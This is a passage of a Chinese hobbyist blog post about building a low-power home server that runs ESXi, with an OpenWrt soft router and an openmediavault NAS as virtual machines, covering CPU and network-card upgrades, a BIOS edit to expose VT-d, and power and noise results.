v3散片，以替换性能羸弱的G1840并获得VT-d支持。  \n\n\n\n被替换下来的G1840\n\n\n\n\n\n\n网卡在All in One里面十分重要，而板载网卡不仅带宽十分感人且第三方驱动仅支持到ESXi6.0，于是笔者从闲鱼以25元购入了一块HP-331FLR服务器网卡，这个网卡搭载了博通BCM5719芯片，拥有ESXi7.0的原生支持，最重要的是，它有4个网口！虽然HP的服务器网卡不能直接插在家用主板的PCIe口上，但是可以通过转接板转成家用的PCIe x8接口，于是又从闲鱼以20元购入了一块转接板。所幸之前选择了带有集成显卡的CPU，否则网卡将因为没有多余的PCIe接口而无法安装。\n而给NAS的硬盘则选择了性价比极高的西数HC320 8TB企业盘,而这个硬盘功耗为12V0.9A,是之前西数紫盘的(12V0.45A)2倍,可能需要安装一个标准电源.\n从计划的布局来看，网卡的四个网口中有三个会长期占用且数据量有一定的规模，于是给网卡增加一个散热风扇是十分有必要的，正好笔者淘汰了树莓派后多出了一个迷你风扇。而风扇接入的是5v0.2A的直流电，如果从主板散热器供电口（12V）分线给小风扇的话，小风扇噪音极大且容易过载，既然是5v供电，那应该可以从主板多余的USB针脚处借电，查阅USB针脚定义可知应该要把风扇接入到GND和VCC，接入后风扇正常转动，之后使用热熔胶将风扇固定在网卡芯片的导热板上。并且为了加固网卡和PCIe接口以避免插拔网线造成松动，笔者在网卡和PCIe的接口处也封上了热熔胶。\n\n\n\nUSB针脚定义\n\n\n\n\n\n\n\n将风扇的正负极插在USB针脚上\n\n\n \n\n\n\n\n\n改造完成后的网卡全景图\n\n\n\n\n于是，笔者现在获得了一台这样的设备，之后又从电脑城低价购入了一个ITX机箱，装上标准电源及主板硬盘后，组装完成，开始安装系统。\nCPU: Intel Xeon E3-1265L v3 @2.5GhzGPU: CPU集成RAM: 2*4GB DDR3网卡: 4*BCM5719 1000Mbps主板: SOYO-H81-ITXHDD: WD-HC320 8T\n\n\n\n改造完成后的主机\n\n\n\n\n\n\n\n装入ITX机箱并从旧硬盘拷贝数据\n\n\n\n\n3.系统安装学校内网就有ESXi6.7 update2的镜像，下载十分方便，下载完成后写入到u盘，在服务器上用usb启动就能进入到ESXi安装页面。值得一提的是，如果平台不支持Intel VT-d，则需要在安装之前和进入系统之前选择命令行，输入noiommu，否则会在加载系统时的初始化IOV阶段卡住。  \n而梅捷的H81主板BIOS将VT-d选项隐藏起来了，为了确定主板是否能开启VT-d，笔者用aptio提取BIOS镜像，再通过AMIBCP读取BIOS文件，全局搜索VT-d选项，果不其然搜索到了，于是将该选项调整为对用户可见，修改完成后刷入BIOS并进入查看，发现VT-d选项默认开启，在确认使用E3-1265L v3时VT-d Capability 显示为Supported后，放心进入ESXi安装程序。\n\n\n\n需要将选项及其父目录设置为USER才能对普通用户可见\n\n\n\n\n\n后续安装非常顺利，无脑下一步即可。  \n系统安装完成后,打开设置查看硬件状态,网卡已经是支持直通了,于是将非管理网口的网卡全部设置为直通状态.\n\n\n\n将网卡切换为直通\n\n\n\n\n4.应用部署操作系统的选择笔者曾经在树莓派上通过docker安装OpenWrt作旁路由，对OpenWrt比较熟悉，故选择Lean编译的OpenWrt x86作为软路由，这个版本集成了许多插件，UI也十分好看。\nNAS的系统笔者没有选择大多数人选择的黑群晖，而选择了基于Debian10的openmediavault，这个系统功能简洁且能满足个人需求，且支持较多插件，不失为一个不错的选择。\n除了上述两个核心功能，笔者还安装了Ubuntu Server 20.04 LTS，用来挂各种服务以及解决部分M1 Mac的兼容性问题。\n网络部署由于ESXi管理网口不能直通，故只直通了1个网口给OpenWrt做LAN，另外为了防止NAS数据量过大阻塞LAN口，笔者还直通了一个网口给Openmediavault以直接接入下游交换机，多余的一个网口直通给OpenWrt并且与WAN口桥接，必要时可以直接连接这个端口获得学校内网以172开头的IP地址。\n\n\n\n新布局图示\n\n\n\n\n总结经过测试，在仅运行OpenWrt和Openmediavault系统时，整机功耗为40W，而在ubuntu进行一些高占用的任务时，整机功耗会高达60W，使用Apple Watch测量噪音约为39db，处于可接受的水平。从MacBook通过有线连接局域网并使用SMB访问NAS，速度大致接近千兆网络的带宽，可见此时的传输瓶颈为千兆网络而非硬盘，得益于openmediavault，NAS也能通过SMB作为macOS的Time Machine备份主机。至此，All in One主机已经部署完毕。\n\n\n\n使用Apple Watch测量噪音\n\n\n\n\n1. VT-d：定向IO虚拟化技术，是硬件直通到虚拟机的必要条件\n","categories":["Notes"],"tags":["虚拟机","硬件","网络"]}]